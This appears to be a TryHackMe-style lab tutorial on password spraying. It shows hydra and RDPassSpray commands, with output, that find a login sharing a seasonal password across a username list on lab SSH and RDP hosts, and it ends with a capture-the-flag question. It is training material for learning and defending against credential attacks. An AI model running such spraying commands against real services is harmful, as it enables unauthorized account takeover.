# Password Spraying Attack

we will apply the password spraying technique using different scenarios against various services, including:

- SSH
- RDP
- Outlook web access (OWA) portal
- SMB

# SSH

Assume that we have already enumerated the system and created a valid username list.

Hashcat

```bash
           user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Here we can use

to perform the password spraying attack against the SSH service using the Spring2021 password.

Hashcat

```bash
           user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

# RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray (opens in new tab)](https://github.com/xFreed0m/RDPassSpray) to
 password spray against RDP. First, install the tool on your attacking 
machine by following the installation instructions in the tool’s GitHub 
repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:

Hashcat

```bash
           user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Lab machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
```

Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.

Hashcat

```bash
           user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

Hashcat

```bash
           user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

There are various tools that perform a spraying password attack against different services, such as:

### Outlook web access (OWA) portal

Tools:

- [SprayingToolkit (opens in new tab)](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
- [MailSniper (opens in new tab)](https://github.com/dafthack/MailSniper)

# SMB

- Tool: Metasploit (auxiliary/scanner/smb/smb_login)

Answer the questions below

Use the following username list:

Password spraying attack!

```bash
           user@THM:~# cat usernames-list.txt
admin
phillips
burgess
pittman
guess
```

Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag. **What is the flag?**